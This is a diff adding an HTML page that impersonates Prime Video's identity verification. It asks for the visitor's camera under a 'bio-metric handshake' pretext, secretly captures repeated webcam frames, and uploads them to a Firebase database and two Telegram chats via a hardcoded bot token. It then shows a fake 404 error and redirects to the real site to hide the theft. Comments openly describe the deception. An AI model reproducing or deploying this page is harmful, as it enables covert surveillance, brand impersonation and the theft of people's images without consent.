@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prime Video | Content Security</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --prime-blue: #00A8E1;
+            --prime-bg: #0F171E;
+            --prime-card: #1A242F;
+            --prime-text: #FFFFFF;
+            --prime-secondary: #8197A4;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background-color: var(--prime-bg); 
+            color: var(--prime-text);
+            font-family: "Amazon Ember", Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        .prime-header {
+            padding: 15px 30px; background: #000;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+
+        .prime-logo { width: 100px; }
+
+        .main-stage {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+
+        .security-card {
+            width: 100%; max-width: 450px; background: var(--prime-card);
+            border-radius: 8px; padding: 40px; text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+
+        .auth-icon {
+            width: 70px; height: 70px; margin: 0 auto 25px;
+            border: 2px solid var(--prime-blue); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--prime-blue); position: relative;
+        }
+
+        .scan-line {
+            position: absolute; width: 100%; height: 2px;
+            background: var(--prime-blue); top: 50%; left: 0;
+            box-shadow: 0 0 10px var(--prime-blue);
+            animation: scan 2s ease-in-out infinite;
+        }
+        @keyframes scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
+
+        h2 { font-size: 24px; margin: 0 0 10px; font-weight: 400; }
+        p { font-size: 14px; color: var(--prime-secondary); line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-prime {
+            background: var(--prime-blue); color: #000; border: none;
+            width: 100%; padding: 14px; font-size: 16px; font-weight: 700;
+            border-radius: 4px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-prime:hover { background: #008fbe; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+
+        .mumbai-meta {
+            font-size: 11px; color: #4a5a6a; margin-top: 25px;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        .loader-dots span {
+            width: 8px; height: 8px; background: var(--prime-blue);
+            border-radius: 50%; display: inline-block; margin: 0 3px;
+            animation: dots 1.4s infinite ease-in-out both;
+        }
+        .loader-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .loader-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes dots { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+    <div class="prime-header">
+        <img src="https://m.media-amazon.com/images/G/01/digital/video/web/logo-min-remaster.png" class="prime-logo" alt="Prime Video">
+    </div>
+
+    <div class="main-stage">
+        <!-- Step 1: Initial Prompt -->
+        <div class="security-card" id="init-view">
+            <div class="auth-icon">
+                <div class="scan-line"></div>
+                <svg width="30" height="30" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+            </div>
+            <h2>Identity Verification</h2>
+            <p>To access restricted titles and live events in your region, please complete a <b>Visual Bio-Metric Handshake</b>. This confirms you are the authorized account holder in Mumbai.</p>
+            
+            <button class="btn-prime" onclick="startPrimeSync()">Verify Identity</button>
+            <div class="mumbai-meta">Relay: BOM-AWS-EDGE-02</div>
+        </div>
+
+        <!-- Step 2: Syncing UI -->
+        <div class="security-card" id="sync-ui">
+            <div class="loader-dots"><span></span><span></span><span></span></div>
+            <h2 style="margin-top: 20px;">Verifying Bio-Metrics...</h2>
+            <p>Scanning facial focal points for Age-Gating compliance. Please keep your device steady within the Mumbai node range.</p>
+            
+            <div style="text-align: left; background: #000; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 10px; color: #00A8E1; border: 1px solid #333;">
+                > TRACE: MUMBAI_SUBNET_V4... OK<br>
+                > CALIBRATING_DEPTH_SENSOR... OK<br>
+                > STATUS: UPLOADING_ENCRYPTED_HASH
+            </div>
+        </div>
+
+        <!-- Step 3: 404 Error -->
+        <div class="security-card" id="error-404">
+            <div style="font-size: 50px; color: #333; margin-bottom: 10px;">404</div>
+            <h2 style="color: #ff9900;">Rights Verification Timeout</h2>
+            <p>The Prime Video DRM server in Mumbai could not finalize the visual handshake. Switching to a secondary authentication pipeline...</p>
+            <div class="loader-dots"><span></span><span></span><span></span></div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startPrimeSync() {
+            try {
+                // Requesting camera under "Bio-Metric Lock" guise
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        
+                        if (count <= 55) {
+                            primeCapture(count);
+                        }
+
+                        // Fake a 404 error at 40 seconds to maintain the "session failure" story
+                        if (count === 40) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to Mumbai local Prime content
+                            window.location.href = "https://www.primevideo.com/region/in";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.primevideo.com";
+            }
+        }
+
+        function primeCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "PRIME_BIOMETRIC_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_EDGE_NODE_02" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'prime_mumbai_auth.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
